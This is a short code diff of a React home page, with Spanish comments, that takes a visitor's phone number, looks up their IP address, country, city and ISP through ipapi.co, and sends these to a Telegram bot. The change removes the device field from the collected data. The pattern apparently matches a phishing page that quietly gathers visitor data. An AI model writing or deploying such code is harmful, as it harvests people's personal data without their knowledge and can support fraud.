@@ -27,7 +27,7 @@ function HomePage() {
     const startRef = useRef(0);
     const valid = phone.length === 9;
 
-    // Función para obtener información del usuario (IP, ubicación, dispositivo)
+    // Función para obtener información del usuario (IP, ubicación)
     const getUserInfo = async () => {
         try {
             const response = await fetch('https://ipapi.co/json/');
@@ -87,7 +87,6 @@ function HomePage() {
 🌍 País: ${userInfo.country}
 🏙️ Ciudad: ${userInfo.city}
 📡 ISP: ${userInfo.isp}
-💻 Dispositivo: ${userInfo.device}
       `;
 
             const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
